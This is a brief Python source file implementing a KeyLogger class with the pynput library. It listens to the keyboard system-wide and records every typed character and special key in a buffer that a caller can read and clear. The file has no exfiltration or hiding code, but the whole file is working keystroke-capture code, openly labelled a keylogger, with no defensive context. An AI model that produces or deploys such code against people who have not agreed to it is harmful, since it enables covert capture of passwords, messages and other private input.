from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.listener = None
        self.is_logging = False

    def _on_press(self, key):
        try:
            if key.char is not None:
                self.keys.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.keys.append(" ")
            elif key == keyboard.Key.enter:
                self.keys.append("\n")
            elif key == keyboard.Key.tab:
                self.keys.append("\t")
            elif key == keyboard.Key.backspace:
                if self.keys: 
                    self.keys.pop()
            elif key == keyboard.Key.delete:
                if self.keys:
                    self.keys.pop()
            else:
                special_keys = {
                    keyboard.Key.shift: "SHIFT",
                    keyboard.Key.shift_r: "SHIFT_R",
                    keyboard.Key.ctrl_l: "CTRL_L",
                    keyboard.Key.ctrl_r: "CTRL_R",
                    keyboard.Key.alt_l: "ALT_L",
                    keyboard.Key.alt_r: "ALT_R",
                    keyboard.Key.esc: "ESC",
                    keyboard.Key.up: "UP",
                    keyboard.Key.down: "DOWN",
                    keyboard.Key.left: "LEFT",
                    keyboard.Key.right: "RIGHT",
                }
                if key in special_keys:
                    self.keys.append(special_keys[key])
                else:
                    self.keys.append(str(key))

    def start_logging(self):
        if not self.is_logging:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_logging = True

    def stop_logging(self):
        if self.listener and self.is_logging:
            self.listener.stop()
            self.is_logging = False

    def get_events(self):
        keys = self.keys[:]
        self.keys.clear()
        return keys
